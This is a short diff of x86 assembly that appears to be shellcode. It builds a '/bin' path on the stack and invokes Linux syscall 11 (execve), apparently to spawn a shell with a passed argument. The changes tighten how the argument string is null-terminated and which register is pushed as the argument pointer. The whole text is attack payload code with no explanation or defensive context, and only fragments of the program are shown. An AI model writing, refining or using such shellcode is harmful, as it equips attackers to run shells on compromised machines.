@@ -7,10 +7,7 @@ callee:
         xor ecx, ecx
         mov cl, [esi]
         inc esi
-        mov edi, esi
-        cld
-        rep lodsb
-        mov [esi], cl
+        mov [esi+ecx], ch
 main:
         push 11
         pop eax
@@ -23,7 +20,7 @@ main:
         push 0x6e69622f
         mov ebx, esp
         push edx
-        push edi
+        push esi
         push ecx
         push ebx
         mov ecx, esp
